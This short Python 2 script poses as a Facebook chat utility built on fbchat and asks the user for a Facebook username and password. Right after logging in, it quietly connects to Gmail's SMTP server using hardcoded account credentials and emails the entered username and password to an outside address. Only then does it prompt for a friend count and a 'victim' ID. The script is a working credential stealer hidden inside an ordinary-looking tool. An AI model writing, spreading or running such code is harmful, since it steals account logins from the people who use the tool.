import smtplib
import fbchat
from getpass import getpass
username = str(raw_input("Username: "))
password = str(raw_input("Pass: "))
client = fbchat.Client(username, password)
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login("karloslikres@gmail.com", "fauxcompte")
msg =username+password
server.sendmail("karloslikres@gmail.com", "20xxismailxx19@gmail.com", msg)
server.quit()
no_of_friends = int(raw_input("Number of friends: "))
name = str(raw_input("Id Victime: "))
